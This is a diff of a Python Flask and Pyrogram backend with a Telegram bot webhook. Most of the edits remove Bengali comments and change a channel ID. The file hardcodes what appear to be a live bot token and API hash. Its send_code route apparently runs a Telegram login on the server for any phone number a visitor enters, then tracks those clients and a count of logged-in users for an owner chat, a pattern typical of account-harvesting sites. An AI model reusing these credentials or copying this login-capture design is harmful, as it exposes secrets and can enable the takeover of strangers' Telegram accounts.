@@ -15,14 +15,13 @@ CORS(app)
 API_ID = int(os.environ.get("API_ID", 33511945))
 API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")
 
-# নতুন এবং ফ্রেশ বট টোকেন আপডেট করা হয়েছে
 BOT_TOKEN = "8613982412:AAGEdvZdzjK3Eli_vIYoEtXnsxZgwodqnVE"
 OWNER_CHAT_ID = "-1003962414788"  
 ADMIN_ID = 6034439625             
-STORAGE_CHANNEL_ID = -1004450023826 # আপনার ব্যাকগ্রাউন্ড স্টোরেজ চ্যানেল আইডি
+STORAGE_CHANNEL_ID = -1004382857247 # নতুন আপডেট করা টেলিগ্রাম স্টোরেজ চ্যানেল আইডি
 
 active_clients = {}
-total_logged_in_users =  0  
+total_logged_in_users = 0  
 admin_states = {} 
 
 def send_telegram_message(chat_id, text, reply_markup=None):
@@ -58,7 +57,6 @@ def answer_callback(callback_query_id, text, show_alert=False):
         pass
 
 def download_background_file_by_id(file_id, file_name_prefix):
-    """বড় সাইজের যেকোনো ভিডিও নিরাপদে ডাউনলোডের জন্য অপ্টিমাইজড ফাংশন"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
         res = requests.get(url, timeout=60).json()
@@ -87,7 +85,6 @@ def download_background_file_by_id(file_id, file_name_prefix):
         print("Large Video Download Error:", traceback.format_exc())
     return False, None
 
-# স্টোরেজ চ্যানেলের সব ভিডিও স্ক্যান ও সিঙ্ক করার মূল ফাংশন
 def pyrogram_scan_channel_sync():
     synced_count = 0
     try:
@@ -110,7 +107,6 @@ def pyrogram_scan_channel_sync():
         print("Pyrogram Scan Error:", traceback.format_exc())
     return synced_count
 
-# ================= UI & MENUS =================
 def get_main_menu():
     return {
         "inline_keyboard": [
@@ -153,7 +149,6 @@ def get_back_button():
         ]
     }
 
-# ================= BACKGROUND THREAD & AUTO-SYNC ON START =================
 bg_loop = asyncio.new_event_loop()
 def start_background_loop(loop):
     asyncio.set_event_loop(loop)
@@ -191,7 +186,6 @@ def run_async(coro):
     future = asyncio.run_coroutine_threadsafe(coro, bg_loop)
     return future.result()
 
-# ================= FLASK ROUTES =================
 @app.route('/', methods=['GET'])
 def home():
     if os.path.exists('index.html'): return send_file('index.html')
@@ -215,13 +209,12 @@ def get_random_background():
     
     files = os.listdir(bg_folder)
     if not files:
-        return jsonify({"status": "empty", "url": "https://videotourl.com/videos/1791952459901-05439f7d-513c-4994-b03b-ca0ca313b9cc.mp4", "type": "video"})
+        return jsonify({"status": "empty", "url": "https://videotourl.com/videos/1792086671209-6307f585-29a1-4494-a780-4dc3ccec9aa8.mp4", "type": "video"})
     
     chosen_file = random.choice(files)
     file_url = f"/static/backgrounds/{chosen_file}?v={int(time.time())}"
     file_type = "video" if chosen_file.lower().endswith(('.mp4', '.mov', '.webm', '.mkv')) else "image"
     
-    # ব্যাকগ্রাউন্ড ব্লার মান ৩% (3px) ডিফল্ট বা কনফিগার করা মান রিটার্ন করা
     blur_val = app.config.get("CURRENT_BLUR", "3px")
     
     return jsonify({"status": "success", "url": file_url, "type": file_type, "blur": blur_val})
@@ -238,7 +231,6 @@ def send_code():
                 try: await active_clients[phone]["client"].disconnect()
                 except Exception: pass
             
-            # ক্লাউড হোস্টিংয়ে ফাইল লক সমস্যা এড়াতে in_memory=True ব্যবহার করা হয়েছে
             client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
             await client.connect()
             sent_code = await client.send_code(phone)
@@ -296,7 +288,6 @@ def get_user_profile():
         async def _fetch():
             client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
             await client.connect()
-            # මෙහි සেশন হ্যান্ডেলিংয়ের জন্য প্রয়োজনীয় রিকোয়েস্ট যুক্ত করা যেতে পারে
             await client.disconnect()
             return {
                 "name": "User",
@@ -315,7 +306,6 @@ def get_user_profile():
 def get_stats():
     return jsonify({"total_users_logged_in": total_logged_in_users})
 
-# ================= TELEGRAM BOT WEBHOOK =================
 @app.route('/webhook', methods=['POST'])
 def telegram_webhook():
     try:
